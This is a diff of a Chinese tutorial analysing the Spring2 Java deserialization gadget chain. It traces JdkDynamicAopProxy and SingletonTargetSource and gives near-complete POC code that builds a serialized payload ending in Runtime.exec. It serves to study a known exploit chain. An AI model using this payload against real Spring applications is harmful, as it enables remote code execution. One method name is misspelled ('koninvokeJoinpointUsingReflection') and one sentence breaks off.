@@ -1,3 +1,5 @@
+Spring2和Spring1的区别点只在于最终触发`TemplatesImpl`的那个类不同，其他地方都是一样的，所以我这里的前边段会缝合Spring1前边的内容。这样即使你从本篇文章(Spring2)开始阅读，也不会有割裂感。
+
 ## 环境准备
 
 JDK应使用JDK version < 8u73，我这里使用的是JDK 8u66，这是因为该攻击链使用了`sun.reflect.annotation.AnnotationInvocationHandler`。
@@ -9,10 +11,10 @@ JDK应使用JDK version < 8u73，我这里使用的是JDK 8u66，这是因为该
     <artifactId>spring-core</artifactId>
     <version>4.1.4.RELEASE</version>
 </dependency>
-<!-- https://mvnrepository.com/artifact/org.springframework/spring-beans -->
+<!-- https://mvnrepository.com/artifact/org.springframework/spring-aop -->
 <dependency>
     <groupId>org.springframework</groupId>
-    <artifactId>spring-beans</artifactId>
+    <artifactId>spring-aop</artifactId>
     <version>4.1.4.RELEASE</version>
 </dependency>
 ```
@@ -100,7 +102,7 @@ static interface TypeProvider extends Serializable {
 }
 ```
 
-如果我们想让`getType()`方法执行之后能得到一个`TemplatesImpl`对象。这几乎是不可能的，而Spring1链的挖掘者提供了一种动态代理思路来完成这个构造。
+如果我们想让`getType()`方法执行之后能得到一个`TemplatesImpl`对象。这几乎是不可能的，而Spring2链的挖掘者提供了一种动态代理思路来完成这个构造。
 
 我们需要代理一个`TypeProvider`接口的一个动态代理实现，如果触发这个动态代理的`getType`方法之后能返回一个`TemplatesImpl`对象。
 
@@ -111,7 +113,7 @@ public static void main(String[] args) throws Exception {
     // -----------------关注的重点在这儿------------------
     Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
     // 此时我们的xxxxxxx还不知道怎么构建
-    Object typeProviderProxy = Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{typeProvider}, xxxxxxxxx);
+    Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, xxxxxxxxx);
 
 
     // -----------------这段代码只是为了创建MethodInvokeTypeProvider实例-------------------
@@ -132,7 +134,7 @@ public static void main(String[] args) throws Exception {
 
 我们想`xxxxxxxxx`这个类有一个`getType`方法，同时这个`getType`方法能返回一个`TemplatesImpl`对象。
 
-还是找不到对不对！Spring1的链的作者给的这么做的，使用动态代理类：`sun.reflect.annotation.AnnotationInvocationHandler`，这个动态代理类中的代码是这么构造的：
+还是找不到对不对！Spring2的链的作者给的这么做的，使用动态代理类：`sun.reflect.annotation.AnnotationInvocationHandler`，这个动态代理类中的代码是这么构造的：
 
 ![image-20250115211252451](./main.assets/image-20250115211252451.png)
 
@@ -158,7 +160,7 @@ public static void main(String[] args) throws Exception {
     map.put("getType", xxxxxxxxxx);
     InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
     Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
-    Object typeProviderProxy = Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
+    Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
 
 
     // -----------------下边的这段代码就不用关注了-----------------
@@ -188,7 +190,7 @@ public static void main(String[] args) throws Exception {
     // 按理来说，这里的xxxxxxxxxx如果能塞进来一个TemplatesImpl对象，此时我们就能完成攻击链的构造了
     // 很不巧，newProxyInstance的第三个参数是一个必须要实现InvocationHandler接口的动态代理实现类
     // 而TemplatesImpl对象是没有实现这个接口的
-    Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{Type.class, Templates.class}, xxxxxxxxxx);
+    Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{Type.class, Templates.class}, xxxxxxxxxx);
 
     Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
     Constructor<?> aihCtor = annotationInvocationHandler.getDeclaredConstructors()[0];
@@ -199,7 +201,7 @@ public static void main(String[] args) throws Exception {
     map.put("getType", typeTemplatesProxy);
     InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
     Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
-    Object typeProviderProxy = Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
+    Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
 
 
     // -----------------下边的这段代码就不用关注了-----------------
@@ -224,88 +226,180 @@ public static void main(String[] args) throws Exception {
 
 OK，然后开始寻找实现了`InvocationHandler`接口的实现类了。
 
-再回头一开始我们构建的残缺POC中。为了构建`xxxxxxxxxx`中的一个代理类，Spring1的作者找到了一个实现了`InvocationHandler`的接口，同时也更好在后续中利用的类，就是`org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler`这个类。
+再回头一开始我们构建的残缺POC中。为了构建`xxxxxxxxxx`中的一个代理类，Spring2的作者找到了一个实现了`InvocationHandler`的类 `org.springframework.aop.framework.JdkDynamicAopProxy`，同时这个类的好处是刚好可以让我们用来封装`TemplatesImpl`类。
 
-![image-20250115221551265](./main.assets/image-20250115221551265.png)
-
-当我们的`xxxxxxxxxx`中填充的是`org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler`这个类时，因为我们代理了`Type`和`Templates`这两个接口，所以当触发了`Templates`接口中的方法时，就会触发到这个类中的invoke方法中。
-
-所以再次构建我们这个残缺的POC：
+让我们看一下这个类中的关键逻辑，我们知道上一步会触发到这个类中的invoke方法，所以最好的方法是从invoke方法中进行跟踪。
 
 ```java
-public static void main(String[] args) throws Exception {
-        
-    // 创建动态代理实例，这个实例用于创建 Type和Templates 这两个接口的动态代理
-    Class<?> objectFactoryDelegatingInvocationHandler = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
-    Constructor<?> ofdihCtor = objectFactoryDelegatingInvocationHandler.getDeclaredConstructors()[0];
-    ofdihCtor.setAccessible(true);
-    // 此时我们还不知道这个objectFactory应该怎么构造，所以用xxxxxxxxxx来代替
-    InvocationHandler ofpInvocationHandlerInstance = (InvocationHandler)ofdihCtor.newInstance(xxxxxxxxxx);
-    Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{Type.class, Templates.class}, ofpInvocationHandlerInstance);
+final class JdkDynamicAopProxy implements AopProxy, InvocationHandler, Serializable {
+	private static final long serialVersionUID = 5531744639992436476L;
+	private final AdvisedSupport advised;
+	private boolean equalsDefined;
+	private boolean hashCodeDefined;
+    
+    // 重要的参数如下：
+    // method == getOutputProperties
+    // args == 空参 == new Object[0]
+	@Override
+	public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+		MethodInvocation invocation;
+		Object oldProxy = null;
+		boolean setProxyContext = false;
+		// 从this.advised这个类中取出targetSource类
+		TargetSource targetSource = this.advised.targetSource;
+		Class<?> targetClass = null;
+		Object target = null;
 
-    Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-    Constructor<?> aihCtor = annotationInvocationHandler.getDeclaredConstructors()[0];
-    aihCtor.setAccessible(true);
+		try {
+            // this.equalsDefined字段值默认为false，取反后 == true
+            // AopUtils.isEqualsMethod 会判断method的name是否 == "equals"
+            // 很显然不等于，所以这个if语句不会执行
+			if (!this.equalsDefined && AopUtils.isEqualsMethod(method)) {
+				return equals(args[0]);
+			}
+            // this.hashCodeDefined字段值默认为false，取反后 == true
+            // AopUtils.isEqualsMethod 会判断method的name是否 == "hashCode"
+            // 很显然不等于，所以这个if语句不会执行
+			if (!this.hashCodeDefined && AopUtils.isHashCodeMethod(method)) {
+				return hashCode();
+			}
+            // this.advised.opaque字段值默认为false，取反后 == true
+            // method.getDeclaringClass().isInterface()会判断method是否来自于一个接口，因为method是来自Templates接口，所以 == true
+            // method.getDeclaringClass().isAssignableFrom(Advised.class)会判断method是否是Advised.class的子类，但很显然不是，所以这里 == false
+            // 因为最后一个条件不满足，所以这个if也是不满足的
+			if (!this.advised.opaque && method.getDeclaringClass().isInterface() &&
+					method.getDeclaringClass().isAssignableFrom(Advised.class)) {
+				return AopUtils.invokeJoinpointUsingReflection(this.advised, method, args);
+			}
 
-    Map<String, Object> map = new HashMap<>();
-    map.put("getType", typeTemplatesProxy);
-    InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
-    Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
-    Object typeProviderProxy = Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
+			Object retVal;
+			// this.advised.exposeProxy默认为false，所以这个if条件是不满足的
+			if (this.advised.exposeProxy) {
+				oldProxy = AopContext.setCurrentProxy(proxy);
+				setProxyContext = true;
+			}
 
+			// 获取targetSource中的Target字段
+			target = targetSource.getTarget();
+			if (target != null) {
+				targetClass = target.getClass();
+			}
 
-    // -----------------下边的这段代码就不用关注了-----------------
-    Class<?> methodInvokeTypeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
-    Constructor<?> mitpCtor = methodInvokeTypeProvider.getDeclaredConstructors()[0];
-    mitpCtor.setAccessible(true);
-    // 把构建好的动态代理传给MethodInvokeTypeProvider内部的provider属性
-    final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
-    final Field field = mitp.getClass().getDeclaredField("methodName");
-    field.setAccessible(true);
-    field.set(mitp, "getOutputProperties");
+			// Get the interception chain for this method.
+             // 简单来说这个类会从一个advised的cache中读取method，如果method没有在cache中加载过就返回一个空的List<Object>
+			List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);
+
+			// 如果上一步返回的chain是一个空的List<Object>，那么这里的条件就是为true
+             // 就会进入到if语句中
+			if (chain.isEmpty()) {
+                // 这条语句会调用target中的method方法
+                // 也就是说当target为一个TemplatesImpl对象时，则会触发TemplatesImpl对象中的getOutputProperties方法
+				retVal = AopUtils.koninvokeJoinpointUsingReflection(target, method, args);
+                 // ReflectionUtils.makeAccessible(method);
+                 // return method.invoke(target, args);
+			}
+			else {
+				......
+			}
+
+			......
+		}
+		finally {
+            // ......
+		}
+	}
 }
 ```
 
-然后在`org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler`类中的`invoke`方法中，调用`method.invoke(this.objectFactory.getObject(), args);`方法。
+按照上边的代码分析的话，如果我们能把`target`改造成`TemplatesImpl`对象，那么直接就能getShell，OK，我们知道`target`来自于`AdvisedSupport advised`，所以我们来分析一下`AdvisedSupport`中的代码。
 
-现在method参数是可控的、args也是我们想要的空参，所以现在就差一个`objectFactory.getObject()`，如果能返回一个`TemplatesImpl`对象，那就爽了。
+```java
+public class AdvisedSupport extends ProxyConfig implements Advised {
+    TargetSource targetSource = EMPTY_TARGET_SOURCE;
+	public AdvisedSupport() {
+		initMethodCache();
+	}
+	// OK，我们现在知道上一步中的缓存是从这里来的了，这个AdvisedSupport被创建的时候缓存中肯定没有getOutputProperties方法，所以上一步中的那个chain.isEmpty()条件一定是满足的。
+    private void initMethodCache() {
+    	this.methodCache = new ConcurrentHashMap<MethodCacheKey, List<Object>>(32);
+	}
+    // 呕吼，看起来SingletonTargetSource是TargetSource的一个实现类
+    public void setTarget(Object target) {
+    	setTargetSource(new SingletonTargetSource(target));
+	}
+    // TargetSource的Setter方法
+		@Override
+	public void setTargetSource(TargetSource targetSource) {
+		this.targetSource = (targetSource != null ? targetSource : EMPTY_TARGET_SOURCE);
+	}
+    // 上一步获取的就是这个方法
+    // 判断method是否在缓存中，很显然第一次调用时，返回的一定是空的List<Object>
+    public List<Object> getInterceptorsAndDynamicInterceptionAdvice(Method method, Class<?> targetClass) {
+        MethodCacheKey cacheKey = new MethodCacheKey(method);
+        List<Object> cached = this.methodCache.get(cacheKey);
+        if (cached == null) {
+            cached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(
+                    this, method, targetClass);
+            this.methodCache.put(cacheKey, cached);
+        }
+        return cached;
+	}
+}
 
-如果一个类实现了`ObjectFactory<?>`这个接口，同时这个类的getObject方法能返回一个`TemplatesImpl`对象。
+public class SingletonTargetSource implements TargetSource, Serializable {
+	private static final long serialVersionUID = 9031246629662423738L;
+	private final Object target;
+    // SingletonTargetSource这个类中的target居然是一个Object类型，这就非常好办了
+    // Object正好可以存储TemplatesImpl这个类，这样所有的条件就都满足了
+	public SingletonTargetSource(Object target) {
+		Assert.notNull(target, "Target object must not be null");
+		this.target = target;
+	}
 
-哎，你记不记得我们一开始提到的，`sun.reflect.annotation.AnnotationInvocationHandler`这个动态代理的实现类，如果我调用这个动态代理类中的任意方法(如`test`)，我只需要把对应的`memberValues`这个Map中的内容改成这个样子 `Map["test", new Object()];`。
+	@Override
+	public Class<?> getTargetClass() {
+		return this.target.getClass();
+	}
+	// 在getTarget的时候刚好就把Object对象返回过去，这样如果target 是一个 TemplatesImpl实例
+    // 那么执行 AopUtils.koninvokeJoinpointUsingReflection(target, method, args);
+    // 就刚好能触发TemplatesImpl中的method方法
+	@Override
+	public Object getTarget() {
+		return this.target;
+	}
+}
 
-这样的话在调用`test`方法后，就能调用到`AnnotationInvocationHandler`中的invoke方法，然后在这个方法中，就会把 `new Object()`返回给调用者。
+```
 
-同时要记得我们要代理的是一个`ObjectFactory<?>`接口，有了这些关键点后，我们就能构造一个完整的POC了：
+所以`SingletonTargetSource`是一个直接能直接触发`TemplatesImpl`方法的类，有了这些关键点后，我们就能构造一个完整的POC了：
 
 ```java
 public static void main(String[] args) throws Exception {
-    // 因为有两个地方都需要用到sun.reflect.annotation.AnnotationInvocationHandler，所以这里把这个代码提到前边
-    // 以便于两个地方都能调用这个类的构造方法
+    AdvisedSupport as = new AdvisedSupport();
+    // 这里不止有 SingletonTargetSource 对象能触发我们想要的逻辑，我还找到了两个类，也和SingletonTargetSource的做法差不多
+    // LazyInitTargetSource
+    // HotSwappableTargetSource
+    as.setTargetSource(new SingletonTargetSource(TemplatesImpl));
+    // 创建一个JdkDynamicAopProxy类的实例，然后再创建一个动态代理，和我们上边的残缺POC的逻辑接上就可以了
+    Class<?> JdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
+    Constructor<?> JdkDynamicAopProxyCtor = JdkDynamicAopProxyClass.getDeclaredConstructors()[0];
+    JdkDynamicAopProxyCtor.setAccessible(true);
+    InvocationHandler invocationHandler = (InvocationHandler)JdkDynamicAopProxyCtor.newInstance(as);
+    // 按理来说，这里的xxxxxxxxxx如果能塞进来一个TemplatesImpl对象，此时我们就能完成攻击链的构造了
+    // 很不巧，newProxyInstance的第三个参数是一个必须要实现InvocationHandler接口的动态代理实现类
+    // 而TemplatesImpl对象是没有实现这个接口的
+    Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{Type.class, Templates.class}, invocationHandler);
+
     Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
     Constructor<?> aihCtor = annotationInvocationHandler.getDeclaredConstructors()[0];
     aihCtor.setAccessible(true);
 
-    // 在这里我们创建一个AnnotationInvocationHandler的实例
-    // 其中getObject中的xxxxxxxxxx就是我们的TemplatesImpl恶意代码实现类
-    Map<String, Object> templatesImpl = new HashMap<>();
-    templatesImpl.put("getObject", xxxxxxxxxx);
-    InvocationHandler templatesImplInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, templatesImpl);
-    // 同时对AnnotationInvocationHandler创建一个动态代理，这个代理用来代理一个ObjectFactory接口
-    ObjectFactory objectFactoryProxy = (ObjectFactory) Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{ObjectFactory.class}, templatesImplInvocationHandler);
-
-    Class<?> objectFactoryDelegatingInvocationHandler = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
-    Constructor<?> ofdihCtor = objectFactoryDelegatingInvocationHandler.getDeclaredConstructors()[0];
-    ofdihCtor.setAccessible(true);
-    InvocationHandler ofpInvocationHandlerInstance = (InvocationHandler)ofdihCtor.newInstance(objectFactoryProxy);
-    Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{Type.class, Templates.class}, ofpInvocationHandlerInstance);
-
-
     Map<String, Object> map = new HashMap<>();
+    // 此时map中的Object就是我们实现了Type和Templates这两个接口的实例了
     map.put("getType", typeTemplatesProxy);
     InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
     Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
-    Object typeProviderProxy = Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
+    Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
 
 
     // -----------------下边的这段代码就不用关注了-----------------
@@ -317,6 +411,9 @@ public static void main(String[] args) throws Exception {
     final Field field = mitp.getClass().getDeclaredField("methodName");
     field.setAccessible(true);
     field.set(mitp, "getOutputProperties");
+
+    serialize(mitp);
+    unSerialize();
 }
 ```
 
@@ -324,7 +421,7 @@ public static void main(String[] args) throws Exception {
 
 ## 完整POC
 
-在经过了上边分析和POC补全过程后，于是你就得到了和ysoserial中的Spring1攻击链一样的代码，让我们运行这份代码看看效果：
+在经过了上边分析和POC补全过程后，于是你就得到了和ysoserial中的Spring2攻击链一样的代码，同时在最后你还找到了，让我们运行这份代码看看效果：
 
 ```java
 package spring;
@@ -334,7 +431,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
-import org.springframework.beans.factory.ObjectFactory;
+import org.springframework.aop.framework.AdvisedSupport;
+import org.springframework.aop.target.SingletonTargetSource;
 
 import javax.xml.transform.Templates;
 import java.io.FileInputStream;
@@ -345,33 +443,35 @@ import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
 
-public class Spring1 {
-    private static final String serialFileName = "demo.ser";
+public class Spring2 {
+    private static final String serialFileName = "spring2.ser";
 
     public static void main(String[] args) throws Exception {
-        // 因为有两个地方都需要用到sun.reflect.annotation.AnnotationInvocationHandler，所以这里把这个代码提到前边
-        // 以便于两个地方都能调用这个类的构造方法
+
+        TemplatesImpl templates = genTemplates();
+        AdvisedSupport as = new AdvisedSupport();
+        // new LazyInitTargetSource
+        // new HotSwappableTargetSource
+        as.setTargetSource(new SingletonTargetSource(templates));
+        Class<?> JdkDynamicAopProxyClass = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
+        Constructor<?> JdkDynamicAopProxyCtor = JdkDynamicAopProxyClass.getDeclaredConstructors()[0];
+        JdkDynamicAopProxyCtor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler)JdkDynamicAopProxyCtor.newInstance(as);
+        // 按理来说，这里的xxxxxxxxxx如果能塞进来一个TemplatesImpl对象，此时我们就能完成攻击链的构造了
+        // 很不巧，newProxyInstance的第三个参数是一个必须要实现InvocationHandler接口的动态代理实现类
+        // 而TemplatesImpl对象是没有实现这个接口的
+        Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{Type.class, Templates.class}, invocationHandler);
+
         Class<?> annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor<?> aihCtor = annotationInvocationHandler.getDeclaredConstructors()[0];
         aihCtor.setAccessible(true);
 
-        Map<String, Object> templatesImpl = new HashMap<>();
-        templatesImpl.put("getObject", genTemplates());
-        InvocationHandler templatesImplInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, templatesImpl);
-        ObjectFactory objectFactoryProxy = (ObjectFactory) Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{ObjectFactory.class}, templatesImplInvocationHandler);
-
-        Class<?> objectFactoryDelegatingInvocationHandler = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
-        Constructor<?> ofdihCtor = objectFactoryDelegatingInvocationHandler.getDeclaredConstructors()[0];
-        ofdihCtor.setAccessible(true);
-        InvocationHandler ofpInvocationHandlerInstance = (InvocationHandler)ofdihCtor.newInstance(objectFactoryProxy);
-        Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{Type.class, Templates.class}, ofpInvocationHandlerInstance);
-
-
         Map<String, Object> map = new HashMap<>();
+        // 此时map中的Object就是我们实现了Type和Templates这两个接口的实例了
         map.put("getType", typeTemplatesProxy);
         InvocationHandler getTypeMappingInvocationHandler = (InvocationHandler)aihCtor.newInstance(Override.class, map);
         Class<?> typeProvider = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
-        Object typeProviderProxy = Proxy.newProxyInstance(Spring1.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
+        Object typeProviderProxy = Proxy.newProxyInstance(Spring2.class.getClassLoader(), new Class[]{typeProvider}, getTypeMappingInvocationHandler);
 
 
         // -----------------下边的这段代码就不用关注了-----------------
@@ -384,13 +484,10 @@ public class Spring1 {
         field.setAccessible(true);
         field.set(mitp, "getOutputProperties");
 
-        // 调用序列化方法把构造的MethodInvokeTypeProvier对象写入序列化文件
         serialize(mitp);
-        // 从序列化文件中读取对象
         unSerialize();
-
     }
-	
+
     public static void serialize(Object obj)throws Exception {
         FileOutputStream fos = new FileOutputStream(serialFileName);
         ObjectOutputStream oos = new ObjectOutputStream(fos);
@@ -443,13 +540,11 @@ public class Spring1 {
 }
 ```
 
-代码被成功执行，计算器被弹出：
+执行完毕，计算器被弹出。
 
-![image-20250115231357997](./main.assets/image-20250115231357997.png)
+![image-20250116212930196](./main.assets/image-20250116212930196.png)
 
-## 攻击链
-
-下边的攻击链来着于 ysoserial的Spring1中的注释，标注的确实非常清晰，我就不修改了
+## 调用链
 
 * ObjectInputStream.readObject()
   * SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
@@ -463,15 +558,12 @@ public class Spring1 {
     * ReflectionUtils.invokeMethod()
       * Method.invoke()
         * Templates(Proxy).newTransformer()
-          * AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
-            * ObjectFactory(Proxy).getObject()
-              * AnnotationInvocationHandler.invoke()
-                * HashMap.get()
+          * JdkDynamicAopProxy.invoke()
+            * AopUtils.invokeJoinpointUsingReflection()
             * Method.invoke()
               * TemplatesImpl.getOutputProperties()
               * TemplatesImpl.newTransformer()
-                *  TemplatesImpl.getTransletInstance()
-                  * TemplatesImpl.defineTransletClasses()
-                    * TemplatesImpl.TransletClassLoader.defineClass()
-                      * Pwner*(Javassist-generated).<static init>
-                        * Runtime.exec()
+                * TemplatesImpl.getTransletInstance()
+                * TemplatesImpl.defineTransletClasses()
+                  * TemplatesImpl.TransletClassLoader.defineClass()
+                    * Pwner*(Javassist-generated).Runtime.exec()
